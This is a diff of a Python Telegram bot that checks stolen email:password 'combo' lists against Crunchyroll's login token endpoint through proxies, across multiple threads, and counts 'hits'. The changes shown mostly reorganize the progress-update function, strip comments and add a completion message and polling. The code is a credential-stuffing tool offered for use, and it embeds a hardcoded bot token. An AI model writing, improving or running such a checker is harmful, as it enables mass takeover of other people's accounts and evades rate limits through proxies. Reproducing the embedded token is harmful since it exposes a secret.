@@ -4,7 +4,7 @@ import threading
 import itertools
 import os
 
-TOKEN = '7194711538:00AAHGcu6Nj4bb1Ni5dFe764rOvH48CVWaArU'  # <--- Replace with your actual bot token!
+TOKEN = '7194711538:00AAHGcu6Nj4bb1Ni5dFe764rOvH48CVWaArU'  # Replace with your actual bot token
 CRUNCHYROLL_URL = "https://www.crunchyroll.com/auth/v1/token"
 
 # User states and data
@@ -29,6 +29,19 @@ def reset_user_state(user_id):
     }
 
 bot = telebot.TeleBot(TOKEN)
+
+def update_progress(user_id):
+    state = user_states.get(user_id)
+    if not state or not state['progress_msg_id'] or not state['progress_chat_id']:
+        return
+    try:
+        bot.edit_message_text(
+            f"Checked = {state['checked']}\nHits = {state['hits']}\nFail = {state['failures']}\nRetries = {state['retries']}",
+            state['progress_chat_id'],
+            state['progress_msg_id']
+        )
+    except Exception:
+        pass
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
@@ -86,7 +99,6 @@ def document_handler(message):
         return
 
     if state['status'] == 'awaiting_combo':
-        # Receive combo file
         file_info = bot.get_file(message.document.file_id)
         file = bot.download_file(file_info.file_path)
         content = file.decode('utf-8', errors='ignore')
@@ -104,7 +116,6 @@ def document_handler(message):
             "/socks5 For Socks5 Proxy Type"
         )
     elif state['status'] == 'awaiting_proxy_file':
-        # Receive proxy file
         file_info = bot.get_file(message.document.file_id)
         file = bot.download_file(file_info.file_path)
         content = file.decode('utf-8', errors='ignore')
@@ -153,19 +164,6 @@ def bot_count_handler(message):
     )
     threading.Thread(target=check_accounts_multithreaded, args=(message.chat.id, user_id), daemon=True).start()
 
-def update_progress(user_id):
-    state = user_states.get(user_id)
-    if not state or not state['progress_msg_id'] or not state['progress_chat_id']:
-        return
-    try:
-        bot.edit_message_text(
-            f"Checked = {state['checked']}\nHits = {state['hits']}\nFail = {state['failures']}\nRetries = {state['retries']}",
-            state['progress_chat_id'],
-            state['progress_msg_id']
-        )
-    except Exception:
-        pass
-
 def worker_thread(user_id, combos_slice):
     state = user_states.get(user_id)
     if not state:
@@ -181,7 +179,6 @@ def worker_thread(user_id, combos_slice):
             if state['stop_flag']:
                 return
 
-            # Prepare request
             payload = {
                 "device_id": "7B94686C-C9CD-492D-9042-47C39C149F52",
                 "device_name": "iPhone",
@@ -252,7 +249,6 @@ def check_accounts_multithreaded(chat_id, user_id):
     state['progress_msg_id'] = progress_msg.message_id
 
     bot_count = state['bot_count']
-    # Split combos into roughly equal chunks for each thread
     chunks = [combos[i::bot_count] for i in range(bot_count)]
 
     threads = []
@@ -262,9 +258,12 @@ def check_accounts_multithreaded(chat_id, user_id):
         threads.append(t)
     state['threads'] = threads
 
-    # Wait for all threads to finish
     for t in threads:
         t.join()
 
     if not state['stop_flag']:
-        bot.send_message(chat_id, "Your Checking Process is Completed
+        bot.send_message(chat_id, "Your Checking Process is Completed ☑️ ")
+    state['status'] = 'stopped'
+    state['stop_flag'] = False
+
+bot.infinity_polling()
